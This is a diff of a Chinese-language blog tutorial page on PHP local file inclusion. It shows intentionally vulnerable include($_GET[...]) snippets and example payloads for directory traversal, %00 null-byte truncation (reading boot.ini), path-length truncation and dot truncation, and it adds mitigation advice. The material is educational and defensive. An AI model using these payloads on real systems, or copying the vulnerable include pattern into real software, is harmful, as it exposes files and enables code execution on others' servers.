@@ -37,7 +37,7 @@
 <ul>
 <li> 漏洞利用</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">漏洞代码示例：</span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$GET_</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">  include(<span class="variable">$filename</span>);</span><br><span class="line">?&gt;  </span><br><span class="line">读取文件内容：</span><br><span class="line">目录遍历后获取路径，获取的系统中文件内容</span><br><span class="line">htt://www. . /xxx.php?filename=../../../../../../../路径</span><br><span class="line">执行代码：</span><br><span class="line">利用无限制本地文件包含漏洞，可以通过文件包含功能执行任意扩展名的文件中的代码</span><br><span class="line">http://路径/xxx.php?filename=文件</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#漏洞代码示例：</span></span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$GET_</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">  include(<span class="variable">$filename</span>);</span><br><span class="line">?&gt;  </span><br><span class="line"><span class="comment">#读取文件内容：</span></span><br><span class="line">目录遍历后获取路径，获取的系统中文件内容</span><br><span class="line">htt://www. . /xxx.php?filename=../../../../../../../路径</span><br><span class="line"><span class="comment">#利用无限制本地文件包含漏洞，可以通过文件包含功能执行任意扩展名的文件中的代码</span></span><br><span class="line">http://路径/xxx.php?filename=文件</span><br></pre></td></tr></table></figure>
 
 
 
@@ -48,14 +48,26 @@
 <ul>
 <li>%00截断文件包含</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">漏洞条件利用条件：</span><br><span class="line">magic_quotes_gpc=off</span><br><span class="line">PHP版本低于5.3.4</span><br><span class="line">漏洞代码示例</span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filenmae&#x27;</span>];</span><br><span class="line">  include(<span class="variable">$filename</span>.<span class="string">&quot;.html&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#漏洞条件利用条件：</span></span><br><span class="line">magic_quotes_gpc=off</span><br><span class="line">PHP版本低于5.3.4</span><br><span class="line"><span class="comment">#漏洞代码示例</span></span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filenmae&#x27;</span>];</span><br><span class="line">  include(<span class="variable">$filename</span>.<span class="string">&quot;.html&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">payload:http://xxx.com/xx.php?filename=../../../../../../../../boot.ini%00</span><br></pre></td></tr></table></figure>
 
+<ul>
+<li>路径长度截断文件包含</li>
+</ul>
+<p>操作系统存在最大路径长度的限制。可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名截断</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">漏洞利用条件</span><br><span class="line">Windows 下目录的最大路径长度伟256B</span><br><span class="line">Linux 下目录的最大路径长度伟4096B</span><br><span class="line"><span class="comment">#代码示例</span></span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filenmae&#x27;</span>];</span><br><span class="line">  include(<span class="variable">$filename</span>.<span class="string">&quot;.html&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">payload:http://xxx,com/xx.php?filename=test.txt/./././././././././././././././././././././././././././././</span><br></pre></td></tr></table></figure>
 
+<ul>
+<li>点号截断文件包含示例代码</li>
+</ul>
+<p>在windows系统下，点号的长度大于256B时，就可以造成扩展名截断</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filenmae&#x27;</span>];</span><br><span class="line">  include(<span class="variable">$filename</span>.<span class="string">&quot;.html&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">payload:http://xxx,com/xx.php?.........................................................................</span><br></pre></td></tr></table></figure>
 
-
-
-
-
+<ul>
+<li>防护措施</li>
+</ul>
+<p>过滤../../   http://  https://</p>
+<p>php.ini配置文件中的allow_url_fopen=off   alllow_url_include=off   magic_quotes_gpc=on</p>
+<p>白名单验证，仅允许包含运行的指定文件</p>
 <div id="paginator"></div></div><div id="post-footer"><hr><a href="/2021/07/21/renyi/">← Prev 任意文件下载漏洞</a><span style="color: #fe2"> | </span><a href="/2021/07/20/phpruo/">php弱类型比较 Next →</a><hr></div><div id="bottom-btn"><a id="to-top" href="#post-title" title="to top">∧</a></div><div id="Valine"></div><script>new Valine({
  el: '#Valine'
  , appId: ''
